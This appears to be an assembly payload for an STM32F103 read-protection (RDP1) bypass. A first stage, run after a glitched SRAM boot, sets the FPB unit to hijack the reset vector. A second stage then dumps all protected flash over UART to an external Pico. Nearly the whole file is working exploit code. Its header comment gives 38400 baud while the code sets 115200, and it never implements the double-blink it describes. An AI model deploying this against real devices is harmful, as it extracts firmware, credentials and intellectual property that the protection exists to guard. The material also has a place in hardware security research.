/*
 * STM32F103 RDP1 Bypass — Two-stage FPB redirect payload
 *
 * Stage 1 (SRAM boot after POR glitch):
 *   - Configures FPB to redirect reset vector (0x04) to SRAM
 *   - Writes stage 2 address to remap table at 0x20000020
 *   - Turns on LED solid to indicate ready
 *
 * Stage 2 (flash boot after nRST, FPB active):
 *   - CPU fetches reset vector from 0x04, FPB returns stage2 addr
 *   - RDP sees flash boot mode → allows flash reads
 *   - Sends flash dump over USART1 (PA9 TX, 38400 baud, 8MHz HSI)
 *   - Protocol: "RDP1" + CPUID (4 bytes) + continuous flash bytes
 *   - Pico stops reading when it has enough and resets the target
 *   - Double-blink LED when complete
 *
 * NOP sled covers all F103 SRAM boot entry points (0x108, 0x1CC, 0x1E0)
 */
.syntax unified
.thumb
.cpu cortex-m3

.section .text

/* ========== Vector table ========== */
.word 0x20005000          /* Initial SP (top of 20KB SRAM) */
.word nop_sled + 1        /* Reset vector -> NOP sled */

/* NOP sled: 0x20000008 through 0x200001FF (252 NOPs = 504 bytes) */
/* Note: 0x20000020 is within the sled — stage 1 overwrites it with stage2 addr */
nop_sled:
.rept 252
    nop
.endr

/* ========== STAGE 1: Configure FPB ========== */
/* Reached via NOP sled fallthrough after SRAM boot */
stage1_start:
    /* Enable GPIOA clock: RCC_APB2ENR |= (1 << 2) */
    ldr r0, =0x40021018
    ldr r1, [r0]
    orrs r1, r1, #4
    str r1, [r0]

    /* Delay for clock to stabilize */
    movs r2, #100
1:  subs r2, #1
    bne 1b

    /* Configure PA5 as push-pull output, 2MHz */
    ldr r0, =0x40010800   /* GPIOA_CRL */
    ldr r1, [r0]
    bic r1, r1, #0x00F00000
    orr r1, r1, #0x00200000
    str r1, [r0]

    /* Write stage 2 thumb address to remap table at 0x20000020 */
    /* FPB will return this value when CPU reads reset vector from 0x04 */
    ldr r0, =stage2_start + 1
    ldr r1, =0x20000020
    str r0, [r1]

    /* Configure FPB: redirect fetch of 0x04 to remap table */
    ldr r0, =0xE0002000   /* FPB base */
    movs r1, #3            /* FP_CTRL: ENABLE + KEY */
    str r1, [r0, #0]
    movs r1, #0x20         /* FP_REMAP: bits[28:5] -> remap base 0x20000020 */
    str r1, [r0, #4]
    movs r1, #0x05         /* FP_COMP0: ENABLE + match addr 0x04 (REPLACE=00 remap) */
    str r1, [r0, #8]

    /* Turn on PA5 solid to indicate stage 1 complete / FPB configured */
    ldr r4, =0x40010810   /* GPIOA_BSRR */
    movs r0, #32           /* PA5 = bit 5 */
    str r0, [r4]

    /* Infinite loop — wait for Pico to switch BOOT0 and pulse nRST */
stage1_wait:
    b stage1_wait

/* ========== STAGE 2: Flash Dump via UART ========== */
/* Reached via FPB redirect: CPU resets with BOOT0=0 (flash boot),     */
/* reads reset vector from 0x04, FPB returns stage2_start+1 from       */
/* remap table at 0x20000020. RDP sees flash boot → allows flash reads */
.align 2
stage2_start:
    /* Set our own SP (flash SP may point anywhere) */
    ldr sp, =0x20005000

    /* Turn on PA5 immediately to confirm stage 2 entry */
    /* (GPIOA clock may still be on from stage 1, but re-enable to be safe) */
    ldr r0, =0x40021018    /* RCC_APB2ENR */
    ldr r1, [r0]
    orrs r1, r1, #4        /* IOPAEN = bit 2 */
    orr r1, r1, #0x4000    /* USART1EN = bit 14 */
    str r1, [r0]

    /* Long delay for HSI oscillator stabilization after reset */
    ldr r2, =50000
1:  subs r2, #1
    bne 1b

    /* Configure PA5 as push-pull output, 2MHz (LED) */
    ldr r0, =0x40010800   /* GPIOA_CRL */
    ldr r1, [r0]
    bic r1, r1, #0x00F00000
    orr r1, r1, #0x00200000
    str r1, [r0]

    /* LED on to confirm stage 2 alive */
    ldr r4, =0x40010810   /* GPIOA_BSRR */
    movs r0, #32
    str r0, [r4]

    /* Configure PA9 as AF push-pull, 2MHz: CRH bits[7:4] = 0xA */
    ldr r0, =0x40010804   /* GPIOA_CRH */
    ldr r1, [r0]
    bic r1, r1, #0xF0     /* Clear CNF9+MODE9 */
    orr r1, r1, #0xA0     /* AF push-pull, 2MHz */
    str r1, [r0]

    /* Configure USART1: 115200 baud at 8MHz HSI */
    /* USARTDIV = 8000000 / (16 * 115200) = 4.34 → BRR = 0x45 (4.3125) */
    ldr r0, =0x40013808   /* USART1_BRR */
    movs r1, #0x45
    str r1, [r0]
    ldr r0, =0x4001380C   /* USART1_CR1 */
    movw r1, #0x2008       /* UE (bit 13) + TE (bit 3) */
    str r1, [r0]

    /* Small delay for USART to stabilize */
    movs r2, #200
2:  subs r2, #1
    bne 2b

    /* r4 = USART1 base (SR at +0, DR at +4) — kept across calls */
    ldr r4, =0x40013800

    /* Send header "RDP1" (4 bytes) */
    movs r0, #0x52         /* 'R' */
    bl uart_send_byte
    movs r0, #0x44         /* 'D' */
    bl uart_send_byte
    movs r0, #0x50         /* 'P' */
    bl uart_send_byte
    movs r0, #0x31         /* '1' */
    bl uart_send_byte

    /* Send CPUID as diagnostic (4 bytes, little-endian) */
    /* CPUID at 0xE000ED00 always readable, confirms code is executing */
    ldr r5, =0xE000ED00
    ldr r3, [r5]
    mov r0, r3
    bl uart_send_byte
    lsrs r0, r3, #8
    bl uart_send_byte
    lsrs r0, r3, #16
    bl uart_send_byte
    lsrs r0, r3, #24
    bl uart_send_byte

    /* Dump flash continuously — Pico resets target when done */
    ldr r5, =0x08000000   /* Flash base */
dump_loop:
    ldr r3, [r5]           /* Read flash word */

    /* Send 4 bytes little-endian */
    mov r0, r3
    bl uart_send_byte
    lsrs r0, r3, #8
    bl uart_send_byte
    lsrs r0, r3, #16
    bl uart_send_byte
    lsrs r0, r3, #24
    bl uart_send_byte

    adds r5, #4
    b dump_loop

/* ========== UART helper ========== */
/* Send byte in r0[7:0] via USART1. Preserves r3-r7, clobbers r0-r2. */
uart_send_byte:
    and r0, r0, #0xFF
1:  ldr r1, [r4]          /* Read USART1_SR */
    tst r1, #0x80          /* TXE = bit 7 */
    beq 1b
    str r0, [r4, #4]      /* Write USART1_DR */
    bx lr

.pool
